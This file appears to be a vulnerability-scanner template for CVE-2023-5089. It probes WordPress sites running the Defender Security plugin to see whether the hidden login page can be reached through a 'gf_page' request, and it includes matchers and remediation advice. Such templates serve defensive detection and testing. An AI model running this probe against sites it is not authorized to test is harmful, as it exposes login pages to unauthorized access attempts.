id: CVE-2023-5089

info:
  name: WordPress Defender Security Plugin - Hidden Login Bypass
  author: jpg0mez
  severity: low
  description: |
    The Defender Security WordPress plugin before 4.1.0 does not prevent redirects to the login page via the auth_redirect WordPress function,
    allowing an unauthenticated visitor to access the login page, even when the hide login page functionality of the plugin is enabled.
    -----IMPORTANT------
    Note: This PoC calls the auth_redirect function via GravityForms (gf_page). Most WordPress plugins that hide the login page are vulnerable
    to this, so be sure to confirm the target is using WP-Defender.
  remediation: |
    Upgrade to the latest version to mitigate this vulnerability.
  reference:
    - https://www.sprocketsecurity.com/resources/discovering-wp-admin-urls-in-wordpress-with-gravityforms
    - https://wpscan.com/vulnerability/2b547488-187b-44bc-a57d-f876a7d4c87d/
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5089
  tags: wordpress,cve,cve2023,bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/?gf_page=randomstring"
    cookie-reuse: true
    redirects: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "loginform"
          - "password"
          - "Powered by WordPress"
        condition: and
      - type: word
        words:
          - "wp-login.php"
        part: header
        negative: true
      - type: word
        words:
          - "wp-login.php"
        part: body
        negative: true
